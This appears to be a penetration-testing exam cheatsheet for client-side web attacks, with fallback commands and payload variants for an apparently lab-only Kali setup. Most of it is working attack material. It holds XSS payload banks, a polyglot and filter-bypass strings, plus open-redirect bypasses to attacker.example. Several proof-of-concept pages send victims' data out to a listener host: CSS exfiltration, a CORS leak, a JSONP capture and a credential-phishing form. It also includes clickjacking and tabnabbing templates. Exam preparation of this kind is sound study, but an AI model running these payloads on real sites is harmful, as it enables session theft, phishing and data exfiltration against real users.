# 📜 Phase 2 Cheatsheet: Fallbacks and Variants

**Primary playbook:** [🧭 phase-walkthrough.md](<./🧭 phase-walkthrough.md>). Use this file when a walkthrough payload fails, a tool is missing, or you need a longer per-context list, a different content-type, or a PoC template. Section names match the walkthrough's **If it fails** lines. Worked, line-by-line solutions for each payload class are in [🧪 LABS/xss.md](<./🧪 LABS/xss.md>).

Placeholders follow the walkthrough: `<URL>`, `<PARAM>`, `<MARKER>`, `<SCHEME>`, `<VHOST>`, `<COOKIE>`, `<PROXY>`, `<LISTENER_IP>`/`<LISTENER_PORT>`, `<ORIGIN>`. Kali has no internet, so nothing here needs it — no OAST/Collaborator domains, only your own listener on the exam network.

⚠️ marks a tool I could not confirm as preinstalled on your exam image. Test it once in the drill; if missing, use the curl/Burp fallback next to it, never install.

---

## Marker sweep variants

```bash
# Burp Intruder, sniper mode: load every parameter as a position, payload = marker only
# Payloads tab → Simple list → zzXSS9f2a    Then grep the response for it under Options → Grep - Match

# Bulk curl loop over a saved parameter list (one per line, from Phase 1 block J)
while read p; do curl -sk -o /tmp/r.html "<SCHEME>://<VHOST>/<URL>?$p=zzXSS9f2a"; grep -q zzXSS9f2a /tmp/r.html && echo "$p reflects"; done < recon/params.txt

# POST body, form-encoded, one field at a time
while read p; do curl -sk -o /tmp/r.html "<SCHEME>://<VHOST>/<URL>" --data-urlencode "$p=zzXSS9f2a"; grep -q zzXSS9f2a /tmp/r.html && echo "$p reflects"; done < recon/params.txt

# JSON body, one field at a time (jq builds the body so quoting stays correct)
echo '{"<PARAM>":"placeholder"}' | jq '.["<PARAM>"]="zzXSS9f2a"' | curl -sk -X POST "<SCHEME>://<VHOST>/<URL>" -H "Content-Type: application/json" -d @- | grep -c zzXSS9f2a

# Headers and cookies in one pass
for h in "User-Agent" "Referer" "X-Forwarded-For" "X-Forwarded-Host" "Origin"; do curl -sk "<SCHEME>://<VHOST>/<URL>" -H "$h: zzXSS9f2a" -o /tmp/r.html; grep -q zzXSS9f2a /tmp/r.html && echo "$h reflects"; done
```

---

## Context probe variants

```bash
# Multipart form (file upload field names, or a mixed form)
curl -sk -F "<PARAM>=zzXSS9f2a'\"<>\`\\" "<SCHEME>://<VHOST>/<URL>" | grep -o "zzXSS9f2a.\{0,40\}"

# XML body
curl -sk -X POST "<SCHEME>://<VHOST>/<URL>" -H "Content-Type: application/xml" --data "<root><PARAM>zzXSS9f2a'\"&lt;&gt;</PARAM></root>" | grep -o "zzXSS9f2a.\{0,40\}"

# Read raw bytes when grep -o truncates oddly on binary-ish responses
curl -sk "<SCHEME>://<VHOST>/<URL>?<PARAM>=zzXSS9f2a%27%22%3C%3E" | xxd | grep -A1 -B1 "7a7a585353"   # zzXSS in hex, to see exact byte-level encoding

# Burp Repeater: send the probe once, then use "Inspector → Response" and search (Ctrl+F) for the marker — faster than re-sending per character
```

---

## Payload bank (longer per-context lists)

### HTML body, nothing encoded

```html
<script>alert(document.domain)</script>
<svg onload=alert(document.domain)>
<img src=x onerror=alert(document.domain)>
<body onload=alert(document.domain)>
<iframe src="javascript:alert(document.domain)">
<details open ontoggle=alert(document.domain)>
<marquee onstart=alert(document.domain)>
<video><source onerror=alert(document.domain)>
<select autofocus onfocus=alert(document.domain)>
```

### HTML attribute breakout

```html
" onmouseover=alert(document.domain) x="
" autofocus onfocus=alert(document.domain) x="
'"><svg onload=alert(document.domain)>
" accesskey="x" onclick="alert(document.domain)
```

### JS string breakout

```javascript
";alert(document.domain);//
';alert(document.domain);//
</script><script>alert(document.domain)</script>
\";alert(document.domain);//        // when a single backslash escapes the closing quote but the value itself isn't re-escaped
-alert(document.domain)-            // inside a numeric-looking context, e.g. var id = 5-alert(1)-6;
```

### URL / javascript: sink

```text
javascript:alert(document.domain)
javascript:alert(document.domain)//harmless-looking-tail-for-a-length-check
data:text/html,<script>alert(document.domain)</script>
```

### Polyglot (fires across several contexts without knowing the exact one first)

```html
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert(document.domain) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(document.domain)//>\x3e
```

---

## Filter bypass cheatsheet

```html
<!-- Tags often missed by a blocklist -->
<svg><animatetransform onbegin=alert(document.domain)>
<math><mtext><table><mglyph><style><img src=x onerror=alert(document.domain)>
<iframe srcdoc="&lt;script&gt;alert(document.domain)&lt;/script&gt;">
<form><button formaction="javascript:alert(document.domain)">x

<!-- Case / whitespace / null-byte variants -->
<ScRiPt>alert(document.domain)</sCriPt>
<img src=x OnErRoR=alert(document.domain)>
<img src=x
onerror
=alert(document.domain)>
<img%09src=x%09onerror=alert(document.domain)>

<!-- Keyword-filter bypass -->
<img src=x onerror=al\u0065rt(document.domain)>
<img src=x onerror=top["al"+"ert"](document.domain)>
<img src=x onerror=window["\x61lert"](document.domain)>
<a href="j&#97;v&#97;script:alert(document.domain)">click</a>

<!-- No-parenthesis bypass (some filters block "(" ) -->
<img src=x onerror=alert`document.domain`>

<!-- Double URL-encoding, for values that round-trip through a redirect or a stored/re-rendered field -->
%253Cscript%253Ealert(1)%253C%252Fscript%253E
```

Allow-list probe loop (full tag and attribute lists, longer than the walkthrough's quick version):

```bash
for tag in script img svg body input iframe details math marquee audio video select form svg/animatetransform; do
  curl -sk --data-urlencode "<PARAM>=<$tag onerror=zzXSS9f2a onload=zzXSS9f2a>" "<SCHEME>://<VHOST>/<URL>" | grep -q zzXSS9f2a && echo "$tag: survives"
done
for attr in onerror onload onfocus onmouseover onpointerover onpointerenter ontoggle onbegin onanimationstart onwheel ondrag onauxclick; do
  curl -sk --data-urlencode "<PARAM>=<img $attr=zzXSS9f2a src=x>" "<SCHEME>://<VHOST>/<URL>" | grep -q zzXSS9f2a && echo "$attr: survives"
done
```

---

## Stored XSS write surfaces (fuller list)

| Surface | Where the output usually lands |
|---|---|
| Display name / username | Any page listing users, admin user table, comments signed with that name |
| Profile bio / "about me" | The public profile page, sometimes a "recent users" widget on the homepage |
| Comment / review / rating text | The post/product page, an admin moderation queue |
| Support ticket / contact form message | An admin ticket viewer, an email notification rendered as HTML |
| Uploaded filename | A file-listing page, a "my uploads" page, a download confirmation page |
| `User-Agent` / `Referer` / `X-Forwarded-For` | An admin analytics/access-log viewer |
| Order notes / shipping address (e-commerce demo apps) | Order confirmation, admin order list |
| CSV/PDF export of user-submitted data | The exported file itself, opened in a viewer that renders formulas/HTML |
| Email template fields (invite, password reset) | The rendered HTML email, if the exam environment shows it anywhere |

---

## DOM sources & sinks reference table

| Source (untrusted input) | Sink (dangerous operation) |
|---|---|
| `location.search`, `location.hash`, `location.href` | `document.write()`, `document.writeln()` |
| `document.referrer` | `innerHTML`, `outerHTML`, `insertAdjacentHTML()` |
| `document.URL`, `document.baseURI` | `eval()`, `new Function(...)`, `setTimeout("...", n)`, `setInterval("...", n)` |
| `window.name` | jQuery `$()`/`.html()`/`.append()`/`.attr('href', x)`/`.attr('src', x)` |
| `postMessage` event data | `element.src =`, `element.href =`, `iframe.srcdoc =` |
| `localStorage`/`sessionStorage` read back into the page | `location =`, `location.assign()`, `location.replace()` |
| URL fragment read by a client-side router | `document.execCommand`, `Range.createContextualFragment` |

```bash
# Broader grep across every saved JS bundle at once
grep -noE '(location\.(search|hash|href)|document\.(referrer|URL|baseURI|cookie)|window\.name)[^;]{0,80}' recon/js-*.js
grep -noE '(document\.write|innerHTML|outerHTML|insertAdjacentHTML|eval\(|new Function|setTimeout\(|setInterval\()[^;]{0,80}' recon/js-*.js
```

**DOM Invader** ⚠️ (Burp's built-in DOM XSS helper): if present (Burp browser → Settings → DOM Invader, enabled per-tab), it flags sources/sinks automatically and can auto-fire canary payloads. Treat it as a faster version of the grep above, not a replacement for reading the trace by hand — it still needs you to confirm the finding.

---

## Open redirect & CSS injection payloads

```text
# Open redirect: bypass a naive allow-list that only checks the path starts with "/"
/\/attacker.example
/%2F%2Fattacker.example
https:attacker.example          (no slashes — some parsers still treat this as absolute)
<SCHEME>://<VHOST>@attacker.example/      (userinfo trick — browser navigates to attacker.example)
```

```css
/* CSS injection: full attribute-selector exfiltration harness (brute one character at a time) */
<style>
#target[value^="a"] { background: url(http://<LISTENER_IP>:<LISTENER_PORT>/?c=a); }
#target[value^="b"] { background: url(http://<LISTENER_IP>:<LISTENER_PORT>/?c=b); }
/* ... repeat per candidate character, or generate with a one-line loop and paste the output */
</style>
```

```bash
# Generate the full a-z0-9 attribute-selector block instead of typing it by hand
for c in {a..z} {0..9}; do echo "input[name=target][value^=\"$c\"]{background:url(http://<LISTENER_IP>:<LISTENER_PORT>/?c=$c);}"; done
```

---

## CORS PoC page

```html
<script>
fetch('<SCHEME>://<VHOST>/<API_PATH>', {credentials:'include'})
  .then(r => r.text())
  .then(d => { new Image().src = 'http://<LISTENER_IP>:<LISTENER_PORT>/?leak=' + encodeURIComponent(d); });
</script>
```

Host it on `python3 -m http.server`, open it in a browser holding the victim session, and read the leaked body from the listener log. Confirms `WSTG-CLNT-07` end to end.

---

## RIA policy reference

```xml
<!-- crossdomain.xml: permissive, a finding -->
<cross-domain-policy><allow-access-from domain="*" secure="false"/></cross-domain-policy>

<!-- crossdomain.xml: scoped, not a finding -->
<cross-domain-policy><allow-access-from domain="*.target.com"/></cross-domain-policy>

<!-- clientaccesspolicy.xml (Silverlight): permissive -->
<access-policy><cross-domain-access><policy><allow-from><domain uri="*"/></allow-from><grant-to><resource path="/" include-subpaths="true"/></grant-to></policy></cross-domain-access></access-policy>
```

---

## Clickjacking PoC variants

```html
<!-- Full-page invisible overlay, generic -->
<style>body{margin:0;}iframe{opacity:0.0001;position:absolute;top:0;left:0;width:100%;height:100%;z-index:2;border:none;}button{position:absolute;top:250px;left:400px;z-index:1;padding:20px;font-size:20px;}</style>
<button>Claim your prize</button>
<iframe src="<SCHEME>://<VHOST>/<URL>"></iframe>

<!-- Drag-and-drop variant, for apps that block simple clicks via a confirm step -->
<style>iframe{opacity:0.0001;position:absolute;top:-200px;left:-400px;}</style>
<div style="position:absolute;top:300px;left:300px;">Drag the image here →</div>
<iframe src="<SCHEME>://<VHOST>/<URL>"></iframe>

<!-- Quick header-only check without building a page -->
curl -sk -I "<SCHEME>://<VHOST>/<URL>" | grep -iE "x-frame-options|content-security-policy"
```

---

## Reverse tabnabbing PoC

```html
<!-- Hosted at the URL the target's target="_blank" link points to -->
<script>
if (window.opener) { window.opener.location = "<SCHEME>://<VHOST>/fake-login"; }
</script>
```

Click the original `target="_blank"` link from the target site, confirm the originating tab silently navigates to the fake page while this tab stays open as the decoy.

---

## WebSocket handshake variants

```bash
# Raw handshake with a chosen Origin (curl, no extra tools)
curl -sk -i "<SCHEME>://<VHOST>/<WS_PATH>" -H "Upgrade: websocket" -H "Connection: Upgrade" -H "Origin: <ORIGIN>" -H "Sec-WebSocket-Key: $(openssl rand -base64 16)" -H "Sec-WebSocket-Version: 13"

# websocat ⚠️, if installed — interactive client, easier for sending several messages
websocat "<WS_SCHEME>://<VHOST>/<WS_PATH>" -H="Origin: <ORIGIN>"

# Python fallback, always available on Kali
python3 - <<'PY'
import socket, base64, os
key = base64.b64encode(os.urandom(16)).decode()
req = (f"GET /<WS_PATH> HTTP/1.1\r\nHost: <VHOST>\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n"
       f"Origin: <ORIGIN>\r\nSec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n\r\n")
s = socket.create_connection(("<VHOST>", <PORT>))
s.sendall(req.encode())
print(s.recv(4096).decode(errors="replace"))
PY
```

Burp's own **WebSockets history** tab (Proxy → WebSockets history) is the primary tool in practice: right-click a captured frame → send to Repeater to resend/tamper a message directly, no extra client needed.

---

## postMessage PoC template

```html
<!-- Hosted on your local server, framing the vulnerable page -->
<iframe id="t" src="<SCHEME>://<VHOST>/<URL>"></iframe>
<script>
window.onload = function() {
  document.getElementById('t').contentWindow.postMessage('<img src=x onerror=alert(document.domain)>', '*');
};
</script>
```

Adjust the message payload to match what the handler actually does with `event.data` (insert into `innerHTML`, `eval`, assign to `location`) — read the handler body first (walkthrough block M) rather than guessing.

---

## Storage and cache inspection snippets

```text
# Browser console, after logging in
Object.entries(localStorage)
Object.entries(sessionStorage)
document.cookie
indexedDB.databases().then(console.log)      // Chromium-based browsers
```

```bash
# Cache headers across a handful of known sensitive pages in one pass
for p in /account /dashboard /admin /profile /orders; do curl -sk -i "<SCHEME>://<VHOST>$p" -b "<COOKIE>" | grep -i "cache-control"; done
```

---

## HTML injection without execution (defacement/phishing templates)

```html
<h1>Session expired</h1>
<form action="http://<LISTENER_IP>:<LISTENER_PORT>/" method="post">
  Please re-enter your credentials:<br>
  Username: <input name="user"><br>
  Password: <input type="password" name="pass"><br>
  <input type="submit" value="Log in">
</form>
```

```html
<!-- Minimal defacement proof, no form needed -->
<h1 style="color:red">Defaced by zzXSS9f2a</h1>
```

---

## Resource manipulation & XSSI templates

```html
<!-- Confirm a theming/widget parameter loads an arbitrary script -->
<!-- Host evil.js: alert(document.domain) -->
<SCHEME>://<VHOST>/<URL>?<PARAM>=//<LISTENER_IP>:<LISTENER_PORT>/evil.js

<!-- XSSI, generic JSONP capture -->
<script>function dump(d){ new Image().src = 'http://<LISTENER_IP>:<LISTENER_PORT>/?d=' + encodeURIComponent(JSON.stringify(d)); }</script>
<script src="<SCHEME>://<VHOST>/<API_PATH>?callback=dump"></script>
```

---

## Tool fallbacks

Kali's defaults (Burp Repeater/Intruder, curl, grep) cover every payload in this phase. These are optional accelerators only — confirm with `command -v <tool>` before relying on one, and fall back to the curl/Burp equivalent next to it if missing.

| Tool | Purpose | Fallback |
|---|---|---|
| `dalfox` ⚠️ | Automated reflected/DOM XSS scanning with parameter mining | The marker sweep + context probe (walkthrough blocks B, C) by hand, or Burp Intruder |
| `XSStrike` ⚠️ | Context-aware payload generation and WAF fingerprinting | The payload bank and filter bypass tables above, built by hand |
| `kxss` ⚠️ | Bulk marker-reflection discovery across many URLs at once | The bulk curl loop under *Marker sweep variants* |
| `xsser` ⚠️ | GUI/CLI automated XSS attack framework (`1. NOTES/4. CROSS-SITE SCRIPTING (XSS)/notes.md`) | Same marker/payload workflow, manually, inside Burp |
| DOM Invader (Burp extension/built-in) | Automated source/sink flagging in the browser | The DOM grep commands above, read by hand in DevTools |
| `websocat` ⚠️ | Interactive WebSocket client | Burp's WebSockets history tab, or the raw Python handshake above |

---

## Reading output

```bash
# Grep a marker with surrounding context, the main "read the response" command of this phase
grep -o "zzXSS9f2a.\{0,40\}" /tmp/r.html

# Count reflections instead of reading them, for count-type exam questions
grep -o "zzXSS9f2a" /tmp/r.html | wc -l

# Search every saved JS bundle for one function name or variable at once
grep -rn "functionName\|variableName" recon/js-*.js

# Anything sensitive already sitting in saved output from this phase
grep -rniE "password|token|secret|api_key|jwt" recon/
```
